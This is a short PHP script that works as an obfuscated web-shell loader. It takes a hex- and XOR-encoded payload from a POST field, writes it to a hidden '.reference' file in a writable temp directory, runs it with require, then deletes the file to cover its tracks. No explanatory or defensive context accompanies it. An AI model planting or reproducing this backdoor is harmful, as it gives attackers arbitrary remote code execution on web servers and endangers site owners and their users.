<?php

if(filter_has_var(INPUT_POST, "\x64\x61t")){
	$holder = array_filter([getenv("TMP"), getcwd(), "/tmp", ini_get("upload_tmp_dir"), session_save_path(), getenv("TEMP"), "/dev/shm", "/var/tmp", sys_get_temp_dir()]);
	$rec = hex2bin($_POST["\x64\x61t"]);
	$val='' ; for($j=0; $j<strlen($rec); $j++){$val .= chr(ord($rec[$j]) ^ 34);}
	foreach ($holder as $key => $data) {
    		if (is_dir($data) ? is_writable($data) : false) {
    $obj = "$data" . "/.reference";
    if (file_put_contents($obj, $val)) {
	require $obj;
	unlink($obj);
	die();
}
}
}
}